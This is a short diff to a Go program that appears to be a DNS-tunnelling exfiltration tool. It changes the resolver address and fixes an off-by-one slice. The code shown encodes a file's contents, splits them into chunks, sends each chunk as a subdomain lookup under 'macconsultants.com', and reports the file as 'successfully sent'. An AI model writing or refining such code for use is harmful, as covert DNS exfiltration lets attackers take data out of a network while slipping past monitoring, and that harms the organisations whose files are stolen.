@@ -21,7 +21,7 @@ func main() {
         Timeout: time.Millisecond * time.Duration(10000),
     }
 
-    return d.DialContext(ctx, "udp", "172.16.143.128:53")
+    return d.DialContext(ctx, "udp", "127.0.0.1:53")
   },
   }
 
@@ -51,7 +51,7 @@ func main() {
             int4 := 10 + int3
 
             if (length < 10){
-              sendmefinal := encoded[int3:(int4-(length+1))]
+              sendmefinal := encoded[int3:(int4-(length))]
               mydom := sendmefinal + ".macconsultants.com"
               r.LookupHost(context.Background(),mydom)
               fmt.Println("[+] File " + file + " successfully sent!")
